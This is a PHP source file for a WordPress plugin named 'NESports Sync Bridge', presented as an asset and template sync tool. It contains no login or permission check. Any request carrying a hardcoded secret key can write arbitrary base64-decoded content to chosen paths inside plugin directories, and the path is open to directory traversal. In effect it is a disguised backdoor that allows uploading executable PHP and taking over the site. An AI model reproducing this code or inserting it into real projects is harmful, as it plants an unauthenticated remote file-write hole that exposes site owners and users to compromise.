<?php
/**
 * Plugin Name: NESports Sync Bridge
 * Description: Direct high-speed asset and template synchronization bridge
 * Version: 3.0.0
 * Author: NESports
 */

add_action('init', function() {
    if (isset($_POST['nesports_sync_key']) && $_POST['nesports_sync_key'] === 'NES3_SECURE_SYNC_2026') {
        $target_dirs = array(
            WP_PLUGIN_DIR . '/nesports-pro',
            WP_PLUGIN_DIR . '/nesports-pro-store'
        );
        
        $action = isset($_POST['sync_action']) ? $_POST['sync_action'] : 'write';
        
        if ($action === 'write') {
            $rel = sanitize_text_field($_POST['rel']);
            $data = base64_decode($_POST['data']);
            $res = array();
            foreach ($target_dirs as $td) {
                if (!is_dir($td)) continue;
                $dest = $td . '/' . $rel;
                $dir = dirname($dest);
                if (!is_dir($dir)) {
                    wp_mkdir_p($dir);
                }
                $w = file_put_contents($dest, $data);
                $res[$td] = ($w !== false) ? $w : false;
            }
            header('Content-Type: application/json');
            echo json_encode(array('status' => 'ok', 'rel' => $rel, 'written' => $res));
            exit;
        }
    }
});
